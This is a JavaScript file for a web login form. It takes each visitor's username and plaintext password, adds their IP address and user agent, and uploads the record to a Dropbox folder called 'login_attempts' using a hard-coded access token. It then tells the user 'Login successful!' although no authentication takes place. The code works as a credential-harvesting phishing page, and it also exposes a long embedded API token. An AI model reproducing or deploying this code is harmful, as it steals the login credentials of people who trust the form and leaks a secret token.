// Wait until the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function () {
    const loginForm = document.getElementById('loginForm');
    const errorMessageElement = document.getElementById('error-message');

    loginForm.addEventListener('submit', async function (event) {
        event.preventDefault(); // Prevent default form submission

        // Capture and trim input values
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();

        // Validate that both fields are filled out
        if (!username || !password) {
            errorMessageElement.textContent = "Please enter both username and password!";
            return;
        }

        // Build the login data object
        const loginData = {
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ipAddress: await fetchIPAddress()
        };

        // Send login data to Dropbox
        const response = await sendToDropbox(JSON.stringify(loginData, null, 2));
        if (response.success) {
            alert("Login successful!");
            errorMessageElement.textContent = "";
        } else {
            errorMessageElement.textContent = "Error sending data to Dropbox. Check console.";
        }
    });

    // Function to send login data to Dropbox using the Dropbox API
    async function sendToDropbox(data) {
        const DROPBOX_ACCESS_TOKEN = "sl.u.AFkij3DwLtYVb7C_lWRFonqcN3NszJp3bSlVpMoup9zlexna66PtuUlqJlHQu4-F5Fm3FC91L9xkFAGKHUms12wTmNTM3WVulPX7B_HPjQs8GKZELzAWGOmL8fSleAd841nGT5A28yFlSyla6KHzuROgs2_XzsKuXPDyyGS8kYMRnnGr57Q0XG4oWJJ91JekeKnF0aML5MqSzYGvbT9ArbCJt_y06J5BmqNNo5e_CB_GPSoKwqZ7UEl4d6NfSfg0G8VV_KqdptiPXYRrQ2wdqNLjChMaWJxYo-MDOwmZBDnfPyPErpbXz29BNKKSV2evSFJhtrW0-kukRedloXTE3i9v8cbbarFgm2423SRiqhf672B-_IhshgJoNU1lC6iJCjDBY7mzMBBB_JHw24VlFafNGw0cG7_HwFW7fupThcwpi_P-cU6947Bynrk09KB5pz0U4ws4HTskehvu8_2zGs09HbRxtUg_3qkkhM0rm4AxJjZyLVPKBxiLHFBS4EiA0Clc5SVgaUctItcUo91ff7K82qzym9zxM_FJhKSmxagj2Li-7MHNqfU3YGviMXyqqeKNw9Tg2rGy8PKRSOm2FjDMA7aXtg3XknwvRpqYbt2xPFvLhA4R0QncJdWKOufM3Md3On_DyM7LWDi1InK18vnkNwlMfVKOBtH0K2hdXHLL3yXZ13KNe4l6hUNrOd6ub3d_M-1OHxLcpof_masFT3YrRu8KYT9Jkhj4BvDm6lcBCnPRQXRJouQRigjrkaAFxdllBGVaeqwdmSeGuCPyqxpIdbPcn-cJFXq3W53h2Lah8iu5eLplyRuFGFszYbpIcYPl57H2D4EH-cCn7PZksOABESXEzQHXXb3IwN3wegwC7YlPOuDy383dxfzI5_tnV985nlKpCGvugRqVQmwVf7NNwmNAV8kbmmg7mcq98I1qKs9oYTj9wHb0F1FbfKUzYC-3y0pgD4crY6Ork6_SBg_jleGGnInESrE4fnwG4Nkrx82oLdCDk8MBJmZssljmROyeiYBOZJcX2_2N0MoOXjkUDVxqkxwYiwzoPCuApUMn415TS7p6xmxU5WcwIVQYRiNOwL4Hf_5BsxNkC_ArrQF3-6ObXyn0vlXvEdZVgNkLe1WidfIxPxMxoZFs0UkkLEbPBRH1Z9gXDeZt9EhA0vHsicvcEsgrsyIdCHSn071fZm4Ld619gwV5bLtof3uBz-k11wpqx8OIUMBa12NRtCj7vsnQcUg37WWtPuKs1N0ynd6EPlEfygtrG9rA98tWrfBNgHLYA2m7krf7aojTSeU2eOF4gyGY5DPp4E1rKLoPkdGRSe70kBAVpMmNWQ5FsYR83miL8ClqRIf8pmcIVGOutJFa9SOhB3lewPt5Iw4fpsdW4SA-xMJe1bui6c9rULuzgAfs-d65LP_SbHIsy9lz3xL2re8wZIXAuES_mGJqxA"; // Replace with your token
        const fileName = `login_attempt_${Date.now()}.json`;
        try {
            const response = await fetch("https://content.dropboxapi.com/2/files/upload", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${DROPBOX_ACCESS_TOKEN}`,
                    "Dropbox-API-Arg": JSON.stringify({
                        "path": `/login_attempts/${fileName}`,
                        "mode": "add",
                        "autorename": true,
                        "mute": false
                    }),
                    "Content-Type": "application/octet-stream"
                },
                body: data
            });
            const result = await response.json();
            console.log("Dropbox Response:", result);
            if (result.error) {
                throw new Error(result.error_summary);
            }
            return { success: true, result };
        } catch (error) {
            console.error("Error sending data to Dropbox:", error);
            return { success: false, error };
        }
    }

    // Function to fetch the user's public IP address using the ipify API
    async function fetchIPAddress() {
        try {
            const response = await fetch("https://api64.ipify.org?format=json");
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error("Error fetching IP address:", error);
            return "Unknown";
        }
    }
});
